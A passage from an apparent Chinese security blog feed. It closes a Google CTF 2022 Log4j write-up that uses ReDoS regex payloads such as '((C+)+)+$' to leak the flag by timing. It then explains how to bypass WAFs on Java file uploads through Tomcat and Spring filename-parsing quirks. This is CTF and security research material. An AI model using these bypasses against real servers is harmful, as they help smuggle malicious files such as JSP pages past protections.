class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">VariablesNotEmptyReplacementConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">UuidPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LineLocationPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">HighlightConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LevelPatternConverter</span>$<span class="title">SimpleLevelPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ThreadIdPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">IntegerPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ClassNamePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ProcessIdPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MaxLengthConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LineSeparatorPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Yellow</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Green</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">RootThrowablePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MethodLocationPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MessagePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">DatePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">White</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">EqualsIgnoreCaseReplacementConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">NdcPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">SequenceNumberPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">RepeatPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">EncodingPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MdcPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Magenta</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MessagePatternConverter</span>$<span class="title">SimpleMessagePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">RegexReplacementConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Black</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ThreadNamePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">NanoTimePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">RelativeTimePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">FileLocationPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MessagePatternConverter</span>$<span class="title">RenderingPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LevelPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">FileDatePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Cyan</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">EqualsReplacementConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ThrowablePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LoggerFqcnPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ExtendedThrowablePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">ThreadPriorityPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MessagePatternConverter</span>$<span class="title">FormattedMessagePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MarkerSimpleNamePatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">EndOfBatchPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">FullLocationPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MapPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Red</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">MarkerPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LoggerPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">LevelPatternConverter</span>$<span class="title">LevelMapLevelPatternConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">StyleConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">AbstractStyleNameConverter</span>$<span class="title">Blue</span></span></span><br></pre></td></tr></table></figure><h3 id="选择合适的类完成challenge"><a href="#选择合适的类完成challenge" class="headerlink" title="选择合适的类完成challenge"></a>选择合适的类完成challenge</h3><p>这里引起我注意的有两个类，一个是和正则相关，一个是和重复相关的英文吸引了我</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">RegexReplacementConverter</span></span></span><br><span class="line"><span class="class"><span class="title">class</span>:<span class="title">org</span>.<span class="title">apache</span>.<span class="title">logging</span>.<span class="title">log4j</span>.<span class="title">core</span>.<span class="title">pattern</span>.<span class="title">RepeatPatternConverter</span></span></span><br></pre></td></tr></table></figure><p>对应使用为</p><p><code>%replace&#123;abc&#125;&#123;a&#125;&#123;d&#125;</code>=&gt;<code>adc</code></p><p><code>%repeat&#123;a&#125;&#123;3&#125;</code>=&gt;<code>aaa</code></p><p>分别看看RegexReplacementConverter<img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/6.png"></p><p>RepeatPatternConverter<img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/7.png"></p><p>结合这两个功能就能大胆猜想能否通过repeat构造超长字符串来消耗正则引擎的性能呢？答案是否？其实代码里很清楚了，只有<code>RegexReplacementConverter</code>有个<code>List&lt;PatternFormatter&gt; formatters = parser.parse(options[0]);</code>这个parse的操作并且这个0决定只能在第一位，第一位是什么就是要替换的类，而repeat里面显然没有，因此这两个也不能嵌套去完成这个题目了</p><p>那么还有什么方式呢？那就是redos，我们只需要构造一个包含具有自我重复的重复性分组的正则表达式即可，比如在<a href="http://cookia.cc/2017/09/13/redos/">Cookia师傅的博文</a>当中找到的(毕竟我懒)</p><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/8.png"></p><p>因此我们可以构造正则<code>^.&#123;x&#125;(.).*$</code>，其中x为数字，分别获取第一….n位对其进行重复之后再在后面加上任意字符<code>x</code>，其实就是构造出<code>aaaaaaaax</code>的形式</p><p>但我发现在jdk8上能成功的redos却在打的时候没用？那个给的docker我也没法构建，后面发现高版本jdk9+以后和jdk8上的有区别</p><p>可以看到<a href="https://rules.sonarsource.com/java/RSPEC-2631">RSPEC-2631</a>中发现ReDoS 问题已在 Java 9 及更高版本中处理，但是功夫不负有心人，又在stackoverflow的主题<a href="https://stackoverflow.com/questions/53048859/is-java-redos-vulnerable">is-java-redos-vulnerable</a>当中发现，明显可以看到这句话通过增加<code>()</code>来增加复杂度，但是这次我在本地9-11版本(当然每个大版本我只有一个小版本的jre可能不全面)都测试通过成功redos</p><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/9.png"></p><p>但是在题目环境仍然是完成解析告诉我<code>Sensitive information detected in output. Censored for security reasons.</code></p><p>最后我决定再为它加点复杂度也就是在最后加一个<code>$</code>，也就是<code>((C+)+)+$</code></p><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/10.png"></p><p>接下来就是写个脚本慢慢跑的问题，也是看心态和代理给不给力的问题</p><p><img src="/2022/07/06/year/2022/7/GoogleCTF2022-Log4j/11.png"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/Q176782/article/details/78288734">https://blog.csdn.net/Q176782/article/details/78288734</a></p><p><a href="http://cookia.cc/2017/09/13/redos/">http://cookia.cc/2017/09/13/redos/</a></p><p><a href="https://www.cnblogs.com/ggband/p/11668879.html">https://www.cnblogs.com/ggband/p/11668879.html</a></p><p><a href="https://rules.sonarsource.com/java/RSPEC-2631">https://rules.sonarsource.com/java/RSPEC-2631</a></p><p><a href="https://stackoverflow.com/questions/53048859/is-java-redos-vulnerable">https://stackoverflow.com/questions/53048859/is-java-redos-vulnerable</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> CTF </tag>
            
            <tag> Log4j2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>探寻Java文件上传流量层面waf绕过姿势系列二</title>
      <link href="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/"/>
      <url>/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="探寻Java文件上传流量层面waf绕过姿势系列二"><a href="#探寻Java文件上传流量层面waf绕过姿势系列二" class="headerlink" title="探寻Java文件上传流量层面waf绕过姿势系列二"></a>探寻Java文件上传流量层面waf绕过姿势系列二</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这篇和上篇不同的是上篇更多关注于RFC文档规范的部分，而这篇更关注于如何从代码层面上的利用来绕过，具体内容请接着往下看</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h3><h4 id="灵活的parseQuotedToken"><a href="#灵活的parseQuotedToken" class="headerlink" title="灵活的parseQuotedToken"></a>灵活的parseQuotedToken</h4><p>继续看看这个解析value的函数，它有两个终止条件，一个是走到最后一个字符，另一个是遇到<code>;</code></p><p>如果我们能灵活控制终止条件，那么waf引擎在此基础上还能不能继续准确识别呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">parseQuotedToken</span><span class="params">(<span class="keyword">final</span> <span class="keyword">char</span>[] terminators)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  i1 = pos;</span><br><span class="line">  i2 = pos;</span><br><span class="line">  <span class="keyword">boolean</span> quoted = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">boolean</span> charEscaped = <span class="keyword">false</span>;</span><br><span class="line">  <span class="keyword">while</span> (hasChar()) &#123;</span><br><span class="line">    ch = chars[pos];</span><br><span class="line">    <span class="keyword">if</span> (!quoted &amp;&amp; isOneOf(ch, terminators)) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!charEscaped &amp;&amp; ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">      quoted = !quoted;</span><br><span class="line">    &#125;</span><br><span class="line">    charEscaped = (!charEscaped &amp;&amp; ch == <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">    i2++;</span><br><span class="line">    pos++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> getToken(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果你理解了上面的代码你就能构造出下面的例子</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/7.png"></p><p>同时我们知道jsp如果带<code>&quot;</code>符号也是可以访问到的，因此我们还可以构造出这样的例子</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/6.png"></p><p>还能更复杂点么，当然可以的结合这里的<code>\</code>，以及上篇文章当中提到的<code>org.apache.tomcat.util.http.parser.HttpParser#unquote</code>中对出现<code>\</code>后参数的转化操作，这时候如果waf检测引擎当中是以最近<code>&quot;&quot;</code>作为一对闭合的匹配，那么waf检测引擎可能会认为这里上传的文件名是<code>y4tacker.txt\</code>,从而放行</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/8.png"></p><h4 id="变形之双写filename-与filename"><a href="#变形之双写filename-与filename" class="headerlink" title="变形之双写filename*与filename"></a>变形之双写filename*与filename</h4><p>这个场景相对简单</p><p>首先tomcat的<code>org.apache.catalina.core.ApplicationPart#getSubmittedFileName</code>的场景下，文件上传解析header的过程当中，存在while循环会不断往后读取，最终会将key/value以Haspmap的形式保存，那么如果我们写多个那么就会对其覆盖，在这个场景下绕过waf引擎没有设计完善在同时出现两个filename的时候到底取第一个还是第二个还是都处理，这些差异性也可能导致出现一些新的场景</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/2.png"></p><p>同时这里下面一方面会删除最后一个<code>*</code></p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/4.png"></p><p>另一方面如果<code>lowerCaseNames</code>为<code>true</code>，那么参数名还会转为小写，恰好这里确实设置了这一点</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/5.png"></p><p>因此综合起来可以写出这样的payload，当然结合上篇还可以变得更多变这里不再讨论</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/3.png"></p><h4 id="变形之编码误用"><a href="#变形之编码误用" class="headerlink" title="变形之编码误用"></a>变形之编码误用</h4><p>假设这样一个场景，waf同时支持多个语言，也升级到了新版本会解析<code>filename*</code>，假设go当中有个编码叫y4，而java当中没有，waf为了效率将两个混合处理，这样会导致什么问题呢？</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/9.png"></p><p>如果没有,这里报错后会保持原来的值，因此我认为这也可以作为一种绕过思路？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  paramValue = RFC2231Utility.hasEncodedValue(paramName) ? RFC2231Utility.decodeText(paramValue)</span><br><span class="line">    : MimeUtility.decodeText(paramValue);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="keyword">final</span> UnsupportedEncodingException e) &#123;</span><br><span class="line">  <span class="comment">// let&#x27;s keep the original value in this case</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Spring4"><a href="#Spring4" class="headerlink" title="Spring4"></a>Spring4</h3><p>这里我用了<code>springboot1.5.20RELEASE</code>+<code>springframework4.3.23</code>，这里不去研究小版本间是否有差异只看看大版本了</p><h4 id="猜猜我在第几层"><a href="#猜猜我在第几层" class="headerlink" title="猜猜我在第几层"></a>猜猜我在第几层</h4><p>说个前提这里只针对单文件上传的情况，虽然这里的代码逻辑一眼看出不能有上面那种存在双写的问题，但是这里又有个更有趣的现象</p><p><img src="/2022/06/21/year/2022/6/%E6%8E%A2%E5%AF%BBJava%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2waf%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E7%B3%BB%E5%88%97%E4%BA%8C/10.png"></p><p>我们来看看这个<code>extractFilename</code>函数里面到底有啥骚操作吧，这里靠函数<code>indexOf</code>去定位key(filename=/filename*=)再做截取操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">extractFilename</span><span class="params">(String contentDisposition, String key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (contentDisposition == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> startIndex = contentDisposition.indexOf(key);</span><br><span class="line">        <span class="keyword">if</span> (startIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String filename = contentDisposition.substring(startIndex + key.length());</span><br><span class="line">            <span class="keyword">int</span> endIndex;</span><br><span class="line">            <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;\&quot;&quot;</span>)) &#123;</span><br><span class="line">                endIndex = filename.indexOf(<span class="string">&quot;\&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (endIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> filename.substring(<span class="number">1</span>, endIndex);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                endIndex = filename.indexOf(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (endIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> filename.substring(<span class="number">0</span>, endIndex);</span><br><span class="line">                